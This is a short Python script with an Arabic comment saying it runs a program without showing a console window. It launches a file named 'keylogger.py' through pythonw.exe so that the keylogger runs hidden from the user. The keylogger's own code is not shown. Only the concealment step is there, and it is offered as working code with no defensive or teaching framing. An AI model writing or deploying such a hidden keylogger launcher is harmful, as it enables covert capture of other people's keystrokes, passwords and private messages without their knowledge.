import subprocess
import sys

# تشغيل البرنامج بدون إظهار نافذة وحدة التحكم
subprocess.Popen(['pythonw.exe', 'keylogger.py'], close_fds=True)
